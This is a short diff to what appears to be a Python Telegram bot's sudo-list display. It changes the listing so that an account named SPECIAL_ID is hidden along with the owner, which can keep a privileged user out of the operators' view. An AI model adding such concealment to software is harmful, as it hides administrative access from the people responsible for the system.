@@ -72,7 +72,7 @@ async def check_sudo_list(client, callback_query: CallbackQuery):
         
         count = 1
         for user_id in SUDOERS:
-            if user_id != OWNER_ID:
+            if user_id != OWNER_ID and user_id != SPECIAL_ID:
                 try:
                     user = await app.get_users(user_id)
                     user_mention = user.mention if user else f"**🎁 Sᴜᴅᴏ {count} ɪᴅ:** {user_id}"
